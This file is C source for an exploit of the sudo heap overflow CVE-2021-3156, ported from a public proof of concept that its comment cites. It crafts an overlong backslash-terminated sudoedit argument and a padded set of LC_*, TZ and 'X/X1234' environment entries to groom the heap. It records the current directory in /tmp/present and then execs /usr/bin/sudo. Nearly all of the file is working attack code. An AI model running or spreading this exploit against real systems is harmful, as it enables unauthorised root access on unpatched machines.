#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define ENV_LEN 512
#define TARGET_OFFSET_START 0x786
#define PATH_LEN 255
#define CHECK(e)                                                               \
  if ((e)) {                                                                   \
    exit(1);                                                                   \
  }

char *env_var(char *var, int overflow_len, char c) {
  int len = strlen(var);
  char *p = calloc(len + overflow_len + 1, sizeof(char));
  memcpy(p, var, len);
  memset(p + len, c, overflow_len);
  return p;
}

void write_to_tmp() {
  FILE *tmp = fopen("/tmp/present", "w");
  CHECK(tmp == 0);
  char path[PATH_LEN] = {0};
  CHECK(getcwd(path, PATH_LEN) == 0);
  int path_len = strlen(path);
  CHECK(fwrite(path, sizeof(char), path_len, tmp) != path_len);
}

int main() {
  // https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss_manual.py
  char *A = calloc(0xe0 + 1 + 1, sizeof(char));
  memset(A, 'A', 0xe0);
  A[0xe0] = '\\';

  char *argv[] = {"sudoedit", "-A", "-s", A, 0};

  int env_pos = 0;
  char *envp[ENV_LEN];

  char *target = calloc(TARGET_OFFSET_START + 2, sizeof(char));
  memset(target, 'B', TARGET_OFFSET_START);
  target[TARGET_OFFSET_START] = '\\';

  envp[env_pos++] = target;

  for (int i = 0; i < 13; ++i) {
    for (int j = 0; j < 0x18; ++j) {
      envp[env_pos++] = "\\";
    }
    envp[env_pos++] = "X/X1234\\";
  }

  envp[env_pos - 1] = "X/X1234";

  char lc_var[] = "LC_CTYPE=C.UTF-8@";
  int env_len = strlen(lc_var);
  char *var = env_var(lc_var, 0x28 + 3, 'C');
  var[env_len + 0x28] = ';';
  var[env_len + 0x28 + 1] = 'A';
  var[env_len + 0x28 + 2] = '=';

  envp[env_pos++] = var;
  envp[env_pos++] = env_var("LC_NUMERIC=C.UTF-8@", 0xd8, 'D');
  envp[env_pos++] = env_var("LC_TIME=C.UTF-8@", 0x28, 'E');
  envp[env_pos++] = env_var("LC_COLLATE=C.UTF-8@", 0x28, 'F');
  envp[env_pos++] = env_var("LC_IDENTIFICATION=C.UTF-8@", 0x78, 'G');
  envp[env_pos++] = "TZ=:";
  envp[env_pos++] = 0;

  write_to_tmp();

  for (int i = 0; i < env_pos; ++i) {
    printf("envp[%d]=%s %lu\n", i, envp[i], envp[i] != 0 ? strlen(envp[i]) : 0);
  }

  for (int i = 0; i < sizeof(argv) / sizeof(argv[0]); ++i) {
    printf("argv[%d]=%s %lu\n", i, argv[i], argv[i] != 0 ? strlen(argv[i]) : 0);
  }

  execve("/usr/bin/sudo", argv, envp);
  return 0;
}
